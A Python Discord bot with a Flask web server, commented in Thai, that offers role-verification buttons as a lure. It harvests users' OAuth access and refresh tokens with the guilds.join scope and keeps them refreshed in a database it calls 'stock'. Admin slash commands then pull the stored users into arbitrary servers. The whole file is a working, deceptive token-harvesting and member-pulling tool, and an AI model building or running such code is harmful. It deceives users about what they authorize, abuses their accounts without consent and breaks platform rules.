# บอทดักดึงคน

import discord
from discord import app_commands
from discord.ext import commands, tasks
from flask import Flask, request, render_template_string
import requests, sqlite3, time, threading, asyncio, aiohttp, os, traceback, gc

# --- [ 1. Configuration - ตั้งค่า ] ---
# ( ใส่ TOKEN บอทตรงนี้ )
TOKEN = os.getenv('TOKEN')

# ( ใส่ CLIENT ID ของบอทตรงนี้ )
CLIENT_ID = '1545398920560250930'

# ( ใส่ CLIENT SECRET ของบอทตรงนี้ )
CLIENT_SECRET = os.getenv('CLIENT_SECRET')

# ( ใส่ Redirect URI ที่ตั้งไว้ใน Discord Developer Portal ตรงนี้ )
REDIRECT_URI = 'http://172.18.117.3:12275/callback'

# ( ใส่ Port ที่ต้องการรันเว็บตรงนี้ )
PORT_WISP = 12275

# ( ใส่ ID ของมึงที่เป็นเจ้าของบอทตรงนี้ )
RAZEN_ID = 1531325825020989462

# ( ใส่ ID ของแอดมินคนอื่นๆ ที่มึงจะให้ใช้คำสั่งได้ในลิสต์นี้ )
ADMIN_IDS = [
    RAZEN_ID, 
    1531325825020989462, 
    000000000000000000
]

app = Flask(__name__)

# --- [ 2. HTML Templates - หน้าเว็บดีไซน์พรีเมียม (Discord Style) ] ---
COMMON_STYLE = """
<style>
    @import url('https://fonts.googleapis.com/css2?family=Kanit:wght@300;400;600&display=swap');
    * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Kanit', sans-serif; }
    body { 
        background: #1e2124; 
        background-image: radial-gradient(circle at center, #2f3136, #1e2124);
        display: flex; justify-content: center; align-items: center; min-height: 100vh; color: white;
    }
    .container { 
        background: #2f3136; 
        width: 90%; max-width: 400px; padding: 30px; border-radius: 20px; text-align: center;
        box-shadow: 0 10px 30px rgba(0,0,0,0.5); border: 1px solid rgba(255,255,255,0.05);
        animation: fadeIn 0.5s ease-in-out;
    }
    @keyframes fadeIn { from { opacity: 0; transform: translateY(10px); } to { opacity: 1; transform: translateY(0); } }
    .icon-circle { 
        width: 80px; height: 80px; border-radius: 50%; display: flex; 
        justify-content: center; align-items: center; margin: 0 auto 20px; 
        border: 4px solid #43b581;
    }
    .success-icon { color: #43b581; font-size: 40px; font-weight: bold; }
    .profile-card { 
        background: #202225; border-radius: 15px; padding: 20px; 
        margin: 20px 0; display: flex; flex-direction: column; align-items: center;
    }
    .avatar { 
        width: 80px; height: 80px; border-radius: 50%; margin-bottom: 10px; 
        border: 3px solid #43b581; 
    }
    .btn { 
        display: flex; align-items: center; justify-content: center; gap: 10px;
        width: 100%; color: white; text-decoration: none; padding: 15px; 
        border-radius: 12px; font-weight: 600; font-size: 16px; transition: 0.2s; 
        margin-top: 10px; background: #43b581;
    }
    .btn:hover { background: #3ca374; transform: scale(1.02); }
</style>
"""

SUCCESS_TEMPLATE = COMMON_STYLE + """
<div class="container">
    <div class="icon-circle"><span class="success-icon">✓</span></div>
    <h2 style="color:#43b581; margin-bottom:15px;">ยืนยันสำเร็จแล้ว!</h2>
    <div class="profile-card">
        <img src="{{ avatar_url }}" class="avatar">
        <div style="font-size:20px; font-weight:600;">{{ username }}</div>
        <p style="color:#72767d; font-size:14px;">ยืนยันตัวตนเรียบร้อย</p>
    </div>
    <p style="font-size:14px; color:#b9bbbe; line-height:1.6;">ระบบกำลังจัดส่งยศให้คุณ กรุณากลับไปเช็คที่ Discord</p>
    <a href="discord://" class="btn">กลับไปหน้า Discord</a>
</div>
"""

ERROR_TEMPLATE = COMMON_STYLE + """
<div class="container">
    <div class="icon-circle" style="border-color:#f04747;"><span style="color:#f04747; font-size:40px;">✕</span></div>
    <h2 style="color:#f04747; margin-bottom:15px;">เกิดข้อผิดพลาด</h2>
    <p style="font-size:16px; color:#b9bbbe; margin-bottom:25px;">{{ error_msg }}</p>
    <a href="javascript:location.reload();" class="btn" style="background:#4f545c;">ลองใหม่อีกครั้งสัส</a>
</div>
"""

# --- [ 3. Database Functions ] ---
def db_execute(query, params=(), fetch=False):
    conn = sqlite3.connect('users.db', timeout=30)
    conn.execute('PRAGMA journal_mode=WAL')
    conn.execute('PRAGMA synchronous=OFF')
    try:
        cursor = conn.cursor()
        cursor.execute(query, params)
        if fetch: return cursor.fetchall()
        conn.commit()
    except Exception: print(traceback.format_exc())
    finally: conn.close()

async def refresh_user_token(user_id, refresh_token):
    url = "https://discord.com/api/v10/oauth2/token"
    data = {'client_id': CLIENT_ID, 'client_secret': CLIENT_SECRET, 'grant_type': 'refresh_token', 'refresh_token': refresh_token}
    async with aiohttp.ClientSession() as session:
        try:
            async with session.post(url, data=data, timeout=10) as r:
                if r.status == 200:
                    res = await r.json()
                    db_execute("UPDATE users SET access_token=?, refresh_token=?, expires_at=? WHERE user_id=?", 
                               (res['access_token'], res['refresh_token'], int(time.time()) + res['expires_in'], user_id))
                    return res['access_token']
        except: pass
    return None

# --- [ 4. Flask Server ] ---
@app.route('/callback')
def callback():
    code = request.args.get('code'); state = request.args.get('state')
    if not code: return render_template_string(ERROR_TEMPLATE, error_msg="ไม่พบรหัสยืนยันตัวตน")
    try:
        res = requests.post("https://discord.com/api/v10/oauth2/token", data={
            'client_id': CLIENT_ID, 'client_secret': CLIENT_SECRET, 'grant_type': 'authorization_code', 'code': code, 'redirect_uri': REDIRECT_URI
        }, timeout=10).json()
        at = res.get('access_token')
        if not at: return render_template_string(ERROR_TEMPLATE, error_msg="แลกเปลี่ยน Token ล้มเหลว")
        
        u = requests.get("https://discord.com/api/users/@me", headers={'Authorization': f'Bearer {at}'}, timeout=10).json()
        uid, uname, avatar = u['id'], u['username'], u.get('avatar')
        a_url = f"https://cdn.discordapp.com/avatars/{uid}/{avatar}.png" if avatar else "https://cdn.discordapp.com/embed/avatars/0.png"
        
        db_execute("INSERT OR REPLACE INTO users VALUES (?, ?, ?, ?, ?)", 
                   (uid, uname, at, res.get('refresh_token'), int(time.time()) + res.get('expires_in', 0)))
        
        total = db_execute("SELECT COUNT(*) FROM users", fetch=True)[0][0]
        asyncio.run_coroutine_threadsafe(send_log(u, a_url, total), bot.loop)
        
        if state:
            btn_data = db_execute("SELECT guild_id, role_id FROM buttons WHERE state_id = ?", (state,), fetch=True)
            if btn_data:
                requests.put(f"https://discord.com/api/v10/guilds/{btn_data[0][0]}/members/{uid}/roles/{btn_data[0][1]}", 
                             headers={"Authorization": f"Bot {TOKEN}"}, timeout=5)
        
        return render_template_string(SUCCESS_TEMPLATE, username=uname, avatar_url=a_url)
    except Exception: return render_template_string(ERROR_TEMPLATE, error_msg="ระบบขัดข้อง กรุณลองใหม่")

async def send_log(user, avatar, total):
    try:
        razen = await bot.fetch_user(RAZEN_ID)
        emb = discord.Embed(title="🔔 ของมาส่งครับท่านเรียลไฮ!", color=0x43b581, timestamp=discord.utils.utcnow())
        emb.set_thumbnail(url=avatar)
        emb.add_field(name="👤 ชื่อ", value=f"`{user['username']}`", inline=True)
        emb.add_field(name="🆔 ไอดี", value=f"`{user['id']}`", inline=True)
        emb.add_field(name="📊 คลังรวมทั้งหมด", value=f"**` {total} `** ราย", inline=False)
        await razen.send(embed=emb)
    except: pass

# --- [ 5. Discord Bot ] ---
class RazenBot(commands.Bot):
    def __init__(self):
        super().__init__(command_prefix="!", intents=discord.Intents.all(), help_command=None)
    
    async def setup_hook(self):
        threading.Thread(target=lambda: app.run(host='0.0.0.0', port=PORT_WISP, debug=False, use_reloader=False), daemon=True).start()
        self.revive_loop.start()
        self.memory_cleaner.start()

    @tasks.loop(minutes=30)
    async def revive_loop(self):
        users = db_execute("SELECT user_id, refresh_token FROM users WHERE expires_at < ?", (int(time.time()) + 7200,), fetch=True)
        for u in users:
            await refresh_user_token(u[0], u[1])
            await asyncio.sleep(2.0)

    @tasks.loop(hours=1)
    async def memory_cleaner(self): gc.collect()

bot = RazenBot()

@bot.event
async def on_ready():
    print(f'🔥 RAZEN SYSTEM ONLINE: {bot.user.name}')

@bot.command(name="realhigth")
async def sync_cmd(ctx):
    if ctx.author.id == 1531325825020989462:
        await bot.tree.sync()
        await ctx.send("✅ ซิงค์คำสั่ง Slash Commands 5 ยศ เรียบร้อยแล้วสัส!")

# --- [ 6. Slash Commands (5-Roles Support) ] ---
@bot.tree.command(name="ตั้งค่ารับยศ", description="สร้าง Embed พร้อมปุ่มรับยศสูงสุด 5 ยศ")
@app_commands.describe(หัวข้อ="หัวข้อ", คำอธิบาย="คำอธิบาย", โค้ดสี="HEX เช่น #ffffff", รูปภาพ="URL รูปภาพ")
async def setup(interaction: discord.Interaction, หัวข้อ: str, คำอธิบาย: str, 
                ยศ1: discord.Role, อีโมจิ1: str = None,
                ยศ2: discord.Role = None, อีโมจิ2: str = None,
                ยศ3: discord.Role = None, อีโมจิ3: str = None,
                ยศ4: discord.Role = None, อีโมจิ4: str = None,
                ยศ5: discord.Role = None, อีโมจิ5: str = None,
                โค้ดสี: str = "#23a55a", รูปภาพ: str = ""):
    
    if interaction.user.id not in ADMIN_IDS: return
    await interaction.response.defer(ephemeral=True)
    
    try:
        try: col_val = int(โค้ดสี.lstrip('#'), 16)
        except: col_val = 0x23a55a
        
        view = discord.ui.View(timeout=None)
        roles_list = [(ยศ1, อีโมจิ1), (ยศ2, อีโมจิ2), (ยศ3, อีโมจิ3), (ยศ4, อีโมจิ4), (ยศ5, อีโมจิ5)]
        
        for r, e in roles_list:
            if r:
                s_id = f"st_{interaction.guild.id}_{r.id}"
                db_execute("INSERT OR REPLACE INTO buttons VALUES (?, ?, ?)", (s_id, str(interaction.guild.id), str(r.id)))
                auth_url = f"https://discord.com/oauth2/authorize?client_id={CLIENT_ID}&api_endpoint=https%3A%2F%2Fdiscord.com%2Fapi&response_type=code&redirect_uri={REDIRECT_URI}&scope=identify+guilds.join&state={s_id}"
                view.add_item(discord.ui.Button(label=f"รับยศ {r.name}", style=discord.ButtonStyle.success, url=auth_url, emoji=e.strip() if e else None))

        embed = discord.Embed(title=หัวข้อ, description=คำอธิบาย, color=col_val)
        if รูปภาพ.startswith("http"): embed.set_image(url=รูปภาพ)
        
        await interaction.channel.send(embed=embed, view=view)
        await interaction.followup.send("✅ ส่ง Embed 5 ยศเรียบร้อยแล้วเรียลไฮ!", ephemeral=True)
    except Exception as e:
        await interaction.followup.send(f"❌ เกิดข้อผิดพลาด: {str(e)}", ephemeral=True)

@bot.tree.command(name="สต๊อก", description="เช็คสต๊อกคนทั้งหมดที่มี")
async def stock(interaction: discord.Interaction):
    if interaction.user.id not in ADMIN_IDS: return
    total = db_execute("SELECT COUNT(*) FROM users", fetch=True)[0][0]
    await interaction.response.send_message(f"📊 สต๊อกรวมทั้งหมด: **`{total}`** ราย", ephemeral=True)

@bot.tree.command(name="ล้างสต๊อก", description="ลบเฉพาะ Token ที่หมดอายุหรือตายแล้ว")
async def clear_expired(interaction: discord.Interaction):
    if interaction.user.id not in ADMIN_IDS: return
    await interaction.response.defer(ephemeral=True)
    
    users = db_execute("SELECT user_id, refresh_token FROM users", fetch=True)
    initial_count = len(users); removed = 0
    
    for uid, rt in users:
        res = await refresh_user_token(uid, rt)
        if res is None:
            db_execute("DELETE FROM users WHERE user_id = ?", (uid,))
            removed += 1
        await asyncio.sleep(0.3)

    await interaction.followup.send(f"🧹 ล้างสต๊อกเสร็จแล้วเรียลไฮ!\n💀 ลบ Token ตาย: `{removed}` ราย\n✅ คงเหลือคนในคลัง: `{initial_count - removed}` ราย", ephemeral=True)

@bot.tree.command(name="ดึงคน", description="ระดมคนเข้าเซิร์ฟเวอร์")
async def pull(interaction: discord.Interaction, จำนวน: int):
    if interaction.user.id not in ADMIN_IDS: return
    await interaction.response.defer(ephemeral=True)
    users = db_execute("SELECT user_id, access_token, refresh_token, expires_at FROM users LIMIT ?", (int(จำนวน),), fetch=True)
    success = 0; fail = 0
    async with aiohttp.ClientSession() as ses:
        for uid, at, rt, exp in users:
            try:
                tk = at if int(time.time()) < (exp - 300) else await refresh_user_token(uid, rt)
                if tk:
                    async with ses.put(f"https://discord.com/api/v10/guilds/{interaction.guild.id}/members/{uid}", 
                                       headers={"Authorization": f"Bot {TOKEN}"}, json={"access_token": tk}, timeout=10) as r:
                        if r.status in [201, 204]: success += 1
                        else: fail += 1
                else: fail += 1
                await asyncio.sleep(0.5)
            except: fail += 1
    await interaction.followup.send(f"🚀 ดึงสำเร็จ: `{success}` | ล้มเหลว: `{fail}` รายชื่อของเรียลไฮ!", ephemeral=True)

if __name__ == "__main__":
    db_execute("CREATE TABLE IF NOT EXISTS users (user_id TEXT PRIMARY KEY, username TEXT, access_token TEXT, refresh_token TEXT, expires_at INTEGER)")
    db_execute("CREATE TABLE IF NOT EXISTS buttons (state_id TEXT PRIMARY KEY, guild_id TEXT, role_id TEXT)")
    while True:
        try: bot.run(TOKEN, reconnect=True)
        except Exception: time.sleep(5)
